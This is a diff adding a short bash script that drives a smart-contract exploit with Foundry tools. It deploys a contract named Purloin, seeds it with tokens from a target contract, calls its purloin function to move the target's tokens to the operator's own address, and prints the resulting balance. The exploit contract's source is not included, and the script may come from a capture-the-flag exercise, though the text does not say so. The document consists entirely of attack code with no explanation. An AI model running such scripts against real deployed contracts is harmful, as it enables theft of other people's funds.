@@ -1,0 +1,23 @@
+#!/bin/bash
+shopt -s expand_aliases
+alias ccs="cast send --private-key $PRIVATE_KEY"
+alias cca="cast call"
+
+echo building and testing
+forge build
+forge test
+
+echo deploying Purloin
+EXPLOIT_ADDRESS=$(forge create --private-key $PRIVATE_KEY --json src/Purloin.sol:Purloin | jq '.deployedTo' --raw-output | cat)
+
+echo transferring initial sum to exploit
+ccs $CONTRACT_ADDRESS 'transfer(address,uint)' $EXPLOIT_ADDRESS 20
+
+echo checking exploit balance
+cca $CONTRACT_ADDRESS 'balanceOf(address)(uint)' $EXPLOIT_ADDRESS
+
+echo performing exploit
+ccs $EXPLOIT_ADDRESS 'purloin(address,address)' $CONTRACT_ADDRESS $MY_ADDRESS
+
+echo our current balance is now:
+cca $CONTRACT_ADDRESS 'balanceOf(address)(uint)' $MY_ADDRESS
